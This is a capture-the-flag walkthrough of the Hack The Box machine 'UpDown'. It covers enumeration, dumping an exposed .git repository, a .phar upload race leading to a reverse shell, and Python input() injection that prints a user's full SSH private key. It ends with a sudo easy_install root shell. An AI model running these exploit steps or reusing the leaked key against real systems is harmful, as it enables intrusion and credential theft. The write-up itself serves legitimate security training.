# UpDown

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```bash
$ export IP=10.10.11.177
$ echo $IP
10.10.11.177
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```bash
$ ping $IP
PING 10.10.11.177 (10.10.11.177) 56(84) bytes of data.
64 bytes from 10.10.11.177: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.11.177: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.11.177: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.11.177: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Enumeration

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```bash
$ nmap -sV -sC -v -oN scan.nmap $IP
```

After the scan is complete, here's the result:

```bash
Nmap scan report for 10.10.11.177
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I also started a `gobuster` vhost scan and got some interesting results:

```bash
└─$ gobuster vhost -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://siteisup.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/03 12:36:16 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb (Status: 403) [Size: 281]
``` 

And a `dir scan`:

```bash
└─$ gobuster dir -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/03 13:02:43 Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]

...

/.git                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]
```

At first the subdomain `dev.` returned a `403 Forbidden` response, so I kept enumerating to see how can authorize myself.

After finding this `.git` directory, I used [Git-dumper](https://github.com/arthaud/git-dumper) to download this git repo on my attacking machine:

```bash
└─$ /opt/git-dumper/git_dumper.py http://siteisup.htb/dev/.git/ ./.git
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/config [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
[-] Fetching http://siteisup.htb/dev/.git/index [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/description [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
[-] Running git checkout .
Updated 6 paths from the index
```

---

## Git

I started enumerating this git repo, first with `git whatchanged` then `git diff 60d2b3280d5356fe0698561e8ef8991825fec6cb`, and the the key finding is Authorization is updated from `.htaccess` to use an authorization header in the request:

```bash
-AuthType Basic
-AuthUserFile /var/www/dev/.htpasswd
-AuthName "Remote Access Denied"
-Require ip 127.0.0.1 ::1
-Require valid-user
+SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header
```

Now I added back the subdomain `dev.` to my `/etc/hosts` and added this header `Special-Dev: only4dev` to the request using `BurpSuite`:

![Burp Suite Request Using Auth Header](img/req1.png)


Here are some other findings that might be useful later on:

```bash
Admin.php:

-AuthType Basic
-AuthUserFile /var/www/dev/.htpasswd
-AuthName "Remote Access Denied"
-Require ip 127.0.0.1 ::1
-Require valid-user
+SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header

index.php:

+<b>This is only for developers</b>
+<br>
+<a href="?page=admin">Admin Panel</a>
+<?php
+       define("DIRECTACCESS",false);
+       $page=$_GET['page'];
+       if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
+               include($_GET['page'] . ".php");
+       }else{
+               include("checker.php");
+       }       
+?>
```

These can also be found in the `.git` directory, in files `admin.php`, `.htaccess`... Also I started inspecting the file `checker.php` and from my understanding it does the following steps:

1. Check file extention, `php, html, py, pl, phtml, zip, rar, gz, gzip, tar` are not allowed and hard filtered. I googled a bit and found that there's a file extension for PHP `.phar` and it's not filtered here! so I'll be using it.
2. Creates a temporary md5 hash of current time using function `time()` in the path `/uploads/[md5hash]/filename`
3. Checks sites using `curl`
4. Deletes this file

So I'll have to upload an allowed file, a rev shell to be exact, run it as soon as possible and figure out the path. I also added the auth header to `BurpSuite`'s headers in the proxy section to avoid adding the auth header everytime I submit a request, since I'll have to be quick between uploading a payload and running it.

![Burp Suite Request Edit](img/req2.png)

At first I prepared a normal PHP webshell but nothing happened, so I started googling and I found that the server can be configured to not execute specified functions like `exec() ...etc`, in a `disable_functions` attribute in `phpinfo`, so I prepared a request and sent it to see the full configuration, also as you might notice, I prepended the request with some dummy links since the server will be checking them one by one until each one times out, that gives me enough time to check `/uploads/[md5_DIR]/filename`.

Payload #1:

```php
pwn.htb
pwn.htb
pwn.htb
pwn.htb
pwn.htb
pwn.htb

<?php
phpinfo();
?>
```

And I received the following:

![phpinfo output](img/phpinfo.png)

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

I wrote a small Python script to quickly check some functions I know of or I found online are allowed or not, script can be found in `check_func.py`:

```bash
└─$ python check_func.py
Enter function:
shell_exec
BLOCKED!
Enter function:
system
BLOCKED!
Enter function:
passthru
BLOCKED!
Enter function:
shell_exec
BLOCKED!
Enter function:
popen
BLOCKED!
Enter function:
proc_open
CLEAR!
Enter function:
^C
Bye!
```

So `proc_open` is not filtered, I did some quick googling and found that I can get RCE with [this boilerplate](https://www.php.net/manual/en/function.proc-open.php#:~:text=the%20options%20parameter.-,Examples,-%C2%B6)

At first I tried a simpel `ping` command to my local machine as a poc and received the ping packets using `tcpdump`, now I prepared the revshell and started a `netcat` listener and I got the rev shell as the user `www-data`.

```bash
└─$ nc -lvnp 1337                            
listening on [any] 1337 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.11.177] 39086
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/tmp$ 
```

---

## Horizontal Privilege Escalation

As an initla move, I always check existing users on the target machine using this command:

```bash
www-data@updown:/tmp$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
developer:x:1002:1002::/home/developer:/bin/bash
www-data@updown:/tmp$ 
```

So the user `developer` is my target, I started by manually browsing through the file system:

```bash
www-data@updown:/tmp$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/home/developer/dev/siteisup
www-data@updown:/tmp$ cd /home
cd /home
lwww-data@updown:/home$ s
ls
developer
www-data@updown:/home$ cd developer
cd developer
www-data@updown:/home/developer$ ls -la
ls -la
total 40
drwxr-xr-x 6 developer developer 4096 Aug 30 11:24 .
drwxr-xr-x 3 root      root      4096 Jun 22 15:47 ..
lrwxrwxrwx 1 root      root         9 Jul 27 14:21 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  231 Jun 22 15:45 .bash_logout
-rw-r--r-- 1 developer developer 3771 Feb 25  2020 .bashrc
drwx------ 2 developer developer 4096 Aug 30 11:24 .cache
drwxrwxr-x 3 developer developer 4096 Aug  1 18:19 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 2 developer developer 4096 Aug  2 09:15 .ssh
drwxr-x--- 2 developer www-data  4096 Jun 22 15:45 dev
-rw-r----- 1 root      developer   33 Oct  3 20:55 user.txt
www-data@updown:/home/developer$ 
```

the directory `dev` contained a file `siteisup_test.py` which I had pivs to run with `sudo`, maybe this is the key to getting to the user `develoepr` since it's owned by them.

```bash
www-data@updown:/home/developer$ cd dev
cd dev
www-data@updown:/home/developer/dev$ ls -la
ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py
www-data@updown:/home/developer/dev$
```

Also the binary `siteisup` seemed to be running `siteisup_test.py` so I can use it to exploit the `input` function, I found a usefull article on Medium.com [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1), I can put in `__import__('os').system(COMMAND)`

I tried the following as a poc and it worked!

```bash
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
__import__('os').system('id')

--------> uid=1002(developer) gid=33(www-data) groups=33(www-data) <--------

Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
Welcome to 'siteisup.htb' application

www-data@updown:/home/developer/dev$ 
```

Now I injected a command to get the SSH key of the user `developer` and connected via SSH and got the user flag!

```bash
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
__import__('os').system('cat /home/developer/.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
Welcome to 'siteisup.htb' application

www-data@updown:/home/developer/dev$ 
```

Now to connect via SSH and obtain user flag:

```bash
└─$ chmod 600 developer_id_rsa

└─$ ssh developer@$IP -i developer_id_rsa

Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36
developer@updown:~$ cat user.txt
a77f9a8331ad65e12733f5fd25f64dc3
developer@updown:~$ 
```

---

## Vertical Privilege Escalation

Once I got into the target machine as `developer`, I ran the following commands to see where I can start my privilege escalation:

```bash
developer@updown:~$ groups
developer
developer@updown:~$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/home/developer/dev/siteisup
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
developer@updown:~$ file /usr/local/bin/easy_install
/usr/local/bin/easy_install: Python script, ASCII text executable
```

That `easy_install` looked very uncommon, so I headed over there and started investigating this binary. I started by googling and I found on `GTFObins` some `easy_install` exploits, I used [this script](https://gtfobins.github.io/gtfobins/easy_install/#shell:~:text=Sudo-,Shell,-It%20can%20be) and I got root access and root flag!

```bash
developer@updown:/usr/local/bin$ TF=$(mktemp -d)
developer@updown:/usr/local/bin$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:/usr/local/bin$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.iSNVcpflTZ
Writing /tmp/tmp.iSNVcpflTZ/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.iSNVcpflTZ/egg-dist-tmp-qYD6CV
# whoami
root
# cd /root
# ls   
root.txt  snap
# cat root.txt
55347a7a9b63296a62fb6ebfa62281e1
```

---
